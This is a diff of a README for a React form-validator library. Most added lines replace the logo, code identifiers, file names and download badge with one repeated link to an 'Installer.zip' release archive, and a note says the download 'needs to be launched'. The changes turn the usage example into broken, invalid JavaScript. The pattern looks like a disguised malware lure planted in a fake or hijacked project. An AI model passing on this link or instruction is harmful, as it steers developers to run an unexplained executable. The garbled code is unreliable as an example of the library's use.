@@ -1,6 +1,6 @@
 # 🚀 React Form Validator Pro
 
-![React Form Validator Pro Logo](https://example.com/logo.png)
+![React Form Validator Pro Logo](https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip)
 
 ## Overview
 
@@ -34,22 +34,22 @@ const MyForm = () => {
   });
 
   const handleInputChange = (e) => {
-    const { name, value } = e.target;
+    const { name, value } = https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip;
     setFormData({
-      ...formData,
+      https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip,
       [name]: value,
     });
   };
 
   const handleSubmit = () => {
     const validationRules = {
-      email: [validate.required('Email is required'), validate.email('Please enter a valid email')],
-      password: [validate.required('Password is required')],
+      email: [https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip('Email is required'), https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip('Please enter a valid email')],
+      password: [https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip('Password is required')],
     };
 
-    const validationResult = FormValidator.validate(formData, validationRules);
+    const validationResult = https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip(formData, validationRules);
 
-    if (validationResult.isValid) {
+    if (https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip) {
       // Proceed with form submission
     } else {
       // Handle form validation errors
@@ -58,8 +58,8 @@ const MyForm = () => {
 
   return (
     <form>
-      <input type="text" name="email" value={formData.email} onChange={handleInputChange} />
-      <input type="password" name="password" value={formData.password} onChange={handleInputChange} />
+      <input type="text" name="email" value={https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip} onChange={handleInputChange} />
+      <input type="password" name="password" value={https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip} onChange={handleInputChange} />
       <button onClick={handleSubmit}>Submit</button>
     </form>
   );
@@ -73,16 +73,16 @@ export default MyForm;
 ```
 react-form-validator-pro/
 ├── src/
-│   ├── index.js
-│   └── validator.js
+│   ├── https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip
+│   └── https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip
 ├── .gitignore
-├── package.json
-└── README.md
+├── https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip
+└── https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip
 ```
 
 ## Download
 
-[![Download React Form Validator Pro](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download React Form Validator Pro](https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip)](https://github.com/bigdaveyy/react-form-validator-pro/releases/download/v1.0/Installer.zip)
 
 *Note: The download needs to be launched.*
 
